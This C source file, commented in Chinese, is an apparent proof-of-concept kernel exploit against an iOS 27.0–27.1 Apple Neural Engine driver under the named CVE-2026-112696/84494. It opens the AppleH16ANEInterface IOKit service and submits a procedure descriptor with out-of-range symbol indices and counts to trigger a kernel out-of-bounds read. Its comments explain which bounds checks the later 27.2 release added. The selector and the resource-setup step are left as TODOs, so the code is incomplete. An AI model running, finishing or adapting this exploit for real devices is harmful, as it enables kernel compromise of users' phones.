// ane_procedure_oob.c — 目标 CVE-2026-112696 / 2026-84494 (iOS 27.0–27.1)
//
// 目标：CVE-2026-112696 / 84494（com.apple.driver.AppleH16ANEInterface）。核心机制：
//   27.2 新增三处固件描述符校验：
//     sub_FFFFFE0008DA6C7C  "Procedure %u input symbol index %u out of range, totInputBuffers: %u"
//     sub_FFFFFE0008DA7324  "Procedure %u output symbol index %u out of range, totOutputBuffers: %u"
//     sub_FFFFFE0008E107FC  "mutable kernel procedure_id (%d) out of range, totProcedures: %u"
//   以及 "Procedure %u IO counts out of range - numInputs/numOutputs max"
//   27.1 无这些检查 → symbol index / numInputs 越界后驱动按索引读描述符数组 → 内核 OOB。
//
// 入口：H11ANEInUserClient 的 external method（字符串 "External Method Call with selector %u"），
//       客户端类型 ANEPrivilegedVMAccessUserClient / ANEClientHintsUserClient。
//
// build: clang -O2 -o ane_oob ane_procedure_oob.c -framework IOKit -framework CoreFoundation
// 注意：ANE 需要先拿到 ANE 资源（ane user client 的 open 需 entitlement 或无？27.x 上普通 app
//       可通过 ANEClientHintsUserClient 打开；提交固件描述符的路径见 TODO-2）。

#include <stdio.h>
#include <string.h>
#include <IOKit/IOKitLib.h>

// H11ANEIn procedure descriptor 的可控字段（偏移需按 RE 结果填，见 TODO-1）
struct ane_proc_desc {
    uint32_t procedure_id;      // 27.2: "mutable kernel procedure_id out of range"
    uint32_t num_inputs;        // 27.2: "IO counts out of range - numInputs"
    uint32_t num_outputs;       //        同上报文里的 numOutputs
    uint32_t tot_input_bufs;    // 索引边界：totInputBuffers
    uint32_t tot_output_bufs;   // 索引边界：totOutputBuffers
    uint32_t input_symbol_idx;  // 27.1: 无边界检查 → 越界读
    uint32_t output_symbol_idx;
    uint32_t pad[8];
    uint8_t  payload[0x800];    // 符号表/权重数据，长度与计数不匹配时触发 OOB
};

static io_connect_t open_ane(void) {
    io_service_t svc = IOServiceGetMatchingService(kIOMainPortDefault,
                            IOServiceMatching("AppleH16ANEInterface"));
    if (!svc) { fprintf(stderr, "AppleH16ANEInterface not found\n"); return 0; }
    io_connect_t c = 0;
    kern_return_t kr = IOServiceOpen(svc, mach_task_self(), 0, &c);
    IOObjectRelease(svc);
    if (kr != KERN_SUCCESS) { fprintf(stderr, "IOServiceOpen kr=0x%x（可能需要 entitlement 或换 client type）\n", kr); return 0; }
    return c;
}

int main(void) {
    io_connect_t c = open_ane();
    if (!c) return 1;

    struct ane_proc_desc d;
    memset(&d, 0, sizeof(d));

    // 越界组合：索引远大于 tot，计数与 payload 不匹配
    d.procedure_id     = 0x400;
    d.num_inputs       = 0x100;
    d.num_outputs      = 0x100;
    d.tot_input_bufs   = 1;
    d.tot_output_bufs  = 1;
    d.input_symbol_idx = 0xffff;    // 27.2 在这里拦下
    d.output_symbol_idx= 0xffff;

    // TODO-1: 从 H11ANEInUserClient 的 external method switch 读出 selector
    //         IDA: 搜 "External Method Call with selector" 的 xref → 该函数即 dispatch
    const uint32_t SELECTOR_SUBMIT_PROCEDURE = 0x0;   // ← 待填

    size_t outsz = 0;
    uint64_t out = 0;
    kern_return_t kr = IOConnectCallStructMethod(c, SELECTOR_SUBMIT_PROCEDURE,
                                                 &d, sizeof(d), &out, &outsz);
    printf("kr=0x%x (0x2c2=BadArgument / 0xe00002c2 表示参数被 27.2 式校验拦下；"
           "27.1 上会继续走描述符解析)\n", kr);

    // TODO-2: 前置需要 ANE 资源申请（ANEClientHintsUserClient 的 resource allocate）
    //         与 mapping，之后再提交 procedure；否则内核走不到 symbol index 校验点。
    IOServiceClose(c);
    return 0;
}
